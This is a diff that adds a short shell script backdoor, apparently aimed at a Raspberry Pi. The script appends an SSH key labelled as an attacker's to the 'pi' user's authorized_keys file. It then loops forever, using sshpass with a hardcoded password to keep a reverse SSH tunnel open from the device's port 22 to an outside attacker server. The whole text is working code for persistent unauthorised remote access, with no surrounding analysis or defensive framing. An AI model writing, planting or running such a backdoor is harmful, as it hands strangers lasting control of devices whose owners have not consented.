@@ -1,0 +1,8 @@
+echo "ssh-rsa AAAAAAAAAAAAAAAAAAAAAAAAA... attackerserver@server_ip" >> /home/pi/.ssh/authorized_keys
+while true;do
+  RET=`ps ax | grep "ssh -f -N -R 7000:localhost:22" | grep -v "grep"`
+  if [ "$RET" = "" ]; then
+    sshpass -p pwned ssh -f -N -R 7000:localhost:22 attackerserver@server_ip
+  fi
+  sleep 10
+done
